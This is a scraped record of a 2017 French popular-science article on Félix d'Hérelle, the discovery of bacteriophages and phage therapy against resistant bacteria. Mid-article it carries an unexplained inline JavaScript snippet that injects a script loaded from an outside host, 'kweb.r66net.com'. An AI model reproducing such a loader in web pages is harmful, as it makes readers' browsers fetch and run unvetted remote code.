{"title": "Fête de la Science 2017 : Félix d’Hérelle découvrait les bactériophages il y a 100 ans", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "10/10/2017", "content": "En 1917, Félix d'Hérelle, chercheur à l'Institut Pasteur de Paris, observa un phénomène étrange : des agents qui détruisaient les bactéries ! Il leur donna le nom de bactériophages, ou « mangeurs de bactéries ». 100 ans plus tard, les bactériophages reviennent dans l'actualité scientifique, à cause de la montée des résistances aux antibiotiques. La phagothérapie, qui consiste à utiliser des phages contre les infections bactériennes, apparaît comme une piste prometteuse contre les superbactéries. Ce qu'il faut retenir Félix d'Hérelle a mis en évidence le bactériophage, ce virus mangeur de bactéries, en 1917 à l'Institut Pasteur de Paris. Il soigna pour la première fois un patient en 1919 en utilisant des phages. L'utilisation de phages (phagothérapie) pourrait apporter aujourd'hui une alternative aux antibiotiques. Méconnu du grand public,  Félix d’Hérelle  (1873-1949) est un scientifique étonnant. Autodidacte, il est à l'origine d'une découverte majeure en microbiologie. C'est en Amérique du sud qu'il apprit les bases de la microbiologie, après avoir déjà connu des expériences professionnelles variées, dans la fabrication du whisky ou du chocolat.  Ses premiers travaux scientifiques visaient à lutter contre les invasions de sauterelles, ce qui lui permit de se faire connaître de la communauté scientifique. Au Mexique, il isola l'agent infectieux de l' entérite  des sauterelles. À partir de 1911, il rejoignit l'Institut Pasteur de Paris. Six ans plus tard, en 1917, il montra dans ses tubes que quelque chose pouvait détruire les  bactéries . En Angleterre, en 1915, Frederick Twort fit des observations similaires et mit lui aussi en évidence un agent qui dissolvait les bactéries. Mais c'est bien à Félix d'Hérelle que l'on doit le terme de « bactériophage », pour nommer l'agent qui tuait les  bactéries . Il faudra attendre plus de 20 ans pour que les  bactériophages  soient observés pour la première fois avec un  microscope . Le génie de Félix d'Hérelle ne s'arrête pas là. Car il comprit très vite que sa découverte pouvait apporter beaucoup à la médecine pour combattre des infections bactériennes. En 1919, il soigna pour la première fois un patient atteint de  dysenterie  en utilisant des phages : la  phagothérapie  était née.  Portrait de Félix d’Hérelle vers 1905, photothèque de l’Institut Pasteur. © Wikipedia, domaine public.                       La phagothérapie, une arme contre les bactéries multirésistantes À l'Institut Pasteur, Félix d'Hérelle ne faisait pas l'unanimité. Il quitta la France et parcourut le monde pour appliquer la  phagothérapie  sur le terrain, là où sévissaient la  peste  et le  choléra  : en Indochine, en Égypte, en Inde... Professeur à l'université de Yale aux États-Unis, il fut plusieurs fois cité au prix Nobel sans jamais l'obtenir.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La vie d'aventurier de Félix d'Hérelle a inspiré un écrivain, Sinclair Lewis, pour son roman  Arrowsmith , publié en 1925, et porté à l'écran en 1931 dans le film du même nom. Le héros, Martin Arrowsmith, est un simple médecin qui gravit les échelons pour devenir un chercheur renommé qui combat la  peste  en Inde. Avec l'avènement des  antibiotiques , la phagothérapie a perdu du terrain. Aujourd'hui, elle n'est pas autorisée en France. Mais de nombreux chercheurs s'y intéressent en raison du nombre croissant de  bactéries multirésistantes  aux antibiotiques. Récemment, deux patients souffrant d'une infection ostéo-articulaire ont ainsi été soignés par phagothérapie à  Lyon . Cette expérimentation avait fait l'objet d'une autorisation temporaire d'utilisation.  Le saviez-vous ? Les résistances aux antibiotiques causeraient environ 12.500 morts par an en France, d’après les résultats de l’étude  Burden . En février 2017, l’OMS a publié une liste de douze bactéries pour lesquelles il est urgent de trouver de nouveaux antibiotiques. La phagothérapie est toujours pratiquée dans certains pays, notamment en Géorgie, à Tbilissi. C'est là que Georgiy Eliava, disciple et ami de Félix d'Hérelle, fonda l' institut de phagothérapie  qui est aujourd'hui un centre de référence mondialement reconnu.  Des bactériophages pour contrer les bactéries résistantes aux antibiotiques                       Les antibiotiques sont de moins en moins efficaces car les bactéries sont de plus en plus résistantes. L’Institut Pasteur travaille donc au quotidien sur des solutions dont l'une utilise les bactériophages, des virus n'infectant que les bactéries. Laurent Debarbieux, responsable du groupe Interactions bactériophages-bactéries chez l’animal, nous en parle plus en détail durant cette interview.                                       ", "theme": "sante"}